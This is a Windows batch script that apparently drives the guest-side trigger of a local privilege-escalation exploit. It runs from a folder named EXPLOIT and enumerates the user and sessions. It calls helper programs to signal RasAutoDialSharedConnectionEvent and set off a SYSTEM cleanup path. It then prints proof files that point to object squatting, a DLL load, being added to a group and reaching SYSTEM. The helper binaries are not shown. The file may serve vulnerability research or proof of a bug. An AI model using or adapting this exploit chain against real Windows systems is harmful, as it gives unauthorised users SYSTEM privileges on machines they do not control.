@echo off
setlocal

cd /d C:\Users\Public\Desktop\EXPLOIT

echo [+] Running Guest-side trigger
echo [+] Current user:
whoami
echo.

echo [+] Current session state
quser
echo.
list_sessions.exe
echo.
probe_console_token.exe
echo.

echo [+] Signaling RasAutoDialSharedConnectionEvent
signal_event.exe
if errorlevel 1 (
    echo [!] signal_event.exe failed with %errorlevel%
    echo.
    echo [+] Shared-connection probe
    query_shared_connection.exe
    exit /b %errorlevel%
)

echo [+] Waiting for the SYSTEM cleanup path
ping -n 30 127.0.0.1 >nul

echo [+] Dumping proof files
echo.
echo [+] squatter.log
type squatter.log
echo.
echo [+] load.txt
if exist load.txt type load.txt
echo.
echo [+] group_add.txt
if exist group_add.txt type group_add.txt
echo.
echo [+] system.txt
if exist system.txt type system.txt
